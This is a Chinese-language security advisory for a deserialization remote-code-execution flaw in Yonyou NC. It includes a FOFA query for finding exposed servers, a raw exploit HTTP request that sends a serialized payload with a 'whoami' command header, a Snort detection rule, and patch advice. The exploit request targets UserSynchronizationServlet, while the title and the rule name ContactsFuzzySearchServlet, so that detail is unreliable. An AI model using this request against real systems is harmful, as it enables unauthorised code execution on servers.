# 用友NC ContactsFuzzySearchServlet存在反序列化代码执行RCE漏洞

用友NC ContactsFuzzySearchServlet存在反序列化代码执行RCE漏洞

# 影响版本

用友NC 65 及更多未明确版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **app=&quot;用友-UFIDA-NC&quot;**

**POC/EXP：**

**step1 反序列化代码执行**

```
POST /servlet/UserSynchronizationServlet?pageId=login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(D:\payload.ser)}}
```

​![image](assets/image-20260909233155-3t6135u.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"用友NC - /servlet/ContactsFuzzySearchServlet 反序列化RCE漏洞";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/servlet/ContactsFuzzySearchServlet"; fast_pattern;
    http.uri; content:"pageId=login"; distance:0;
    http.content_type; content:"application/x-java-serialized-object";
    metadata:
        service http,
        affected_product "用友NC",
        vulnerability_type "Java Deserialization RCE",
        severity "critical";
    classtype:web-application-attack;
    sid:1000757;
    rev:1;
    priority:1;
)
```

# 漏洞修复

* **官方升级**：目前官方已发布漏洞修复版本，建议**立即升级到安全版本**。
* **临时缓解**：

  * 通过防火墙或访问控制策略，**限制对**  **​`/servlet/ContactsFuzzySearchServlet`​**​ **接口的访问**。
  * 关注用友官方安全公告，获取最新修复补丁。

‍
